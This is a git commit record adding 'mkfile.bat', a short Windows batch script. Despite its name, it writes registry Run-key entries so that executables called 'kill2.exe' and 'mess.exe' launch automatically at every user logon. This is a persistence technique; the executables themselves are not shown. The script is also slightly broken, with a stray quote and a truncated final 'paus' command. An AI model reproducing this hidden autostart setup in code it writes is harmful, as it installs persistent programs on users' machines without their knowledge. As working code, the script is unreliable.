0919e31b26a30670a8beda373e2cdc8c5d0411b1
gachao0 <139936691+gachao0@users.noreply.github.com>
2023-07-19 11:47:46 +0900

    Add files via upload

---
+++ mkfile.bat
@@ -0,0 +1,5 @@
+set a=%cd%\kill2.exe
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "kill" /d  "%a%" /f
+set a=%cd%\mess\mess.exe"
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "startm" /d  "%a%" /f
+paus
